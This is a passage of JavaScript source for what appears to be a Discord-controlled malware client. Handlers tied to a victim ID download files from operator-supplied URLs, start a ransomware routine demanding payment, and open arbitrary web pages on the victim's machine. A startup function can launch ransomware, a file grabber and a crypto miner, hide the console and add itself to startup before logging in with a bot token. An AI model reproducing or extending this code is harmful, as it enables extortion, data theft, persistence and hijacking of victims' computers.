                var filepath = makeid(7) + interaction.fields.getTextInputValue("downloadurl").split("/")[interaction.fields.getTextInputValue("downloadurl").split("/").length-1]

                  var options = {
                      directory: os.tmpdir() ,
                      filename: filepath
                  }

                  downloaddd(interaction.fields.getTextInputValue("downloadurl"), options, function(err){
                          var embedDownloaded = new EmbedBuilder()
                            .setColor(0xE9C9FF)
                            .setTitle('Successfully downloaded')
                            .setURL('https://github.com/0xSxZ')
                            .setImage("https://thumbs.gfycat.com/EvenWaryFrog-size_restricted.gif")
                            .addFields({
                              name:"Successfully downloaded", value:"**Path :**" + os.tmpdir() + "\\" +filepath 
                            })
                            .setTimestamp();
                         interaction.reply({ embeds: [embedDownloaded]});
                      if (err) throw err
                    
                  }) 
                  /*

                  const requestt = http.get(, function(response) {
                     response.pipe(file);
                     file.on("finish", () => {
                         file.close();

                     });
                  });
                  */


            }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modalransom"){
                if(testMode == false){
                    rnsm(interaction.fields.getTextInputValue("emaill"), interaction.fields.getTextInputValue("emaill"), interaction.fields.getTextInputValue("amount"));
                }else{
                    interaction.reply("[+] **Test mode is ON**, so the ransomeware can't be executed.")
                }
                
            }else if(interaction.fields.getTextInputValue("victimid") == VictimID && interaction.customId == "modalwebsite"){
              open(interaction.fields.getTextInputValue("url"));
              interaction.reply({ embeds: [embedRick]})
            }
        }
    }catch(e){
        interaction.reply("Error\n" + e)
    }

});


/*

  Launching 
*/

async function Start(){
  if(ransomOnStart===true){await rnsm(emailForRansom, btcAdressForRansom, amountForRansom)}
  if(FilegrabberOnStart == true){await FileGrabber()}
  if(hideCnsl === true){hideSelf()}
  if(OnStart === true){setToStartup()}
  if(mineOnStart == true){await MinerMain()}

  await client.login(TOKEN);
}

Start()
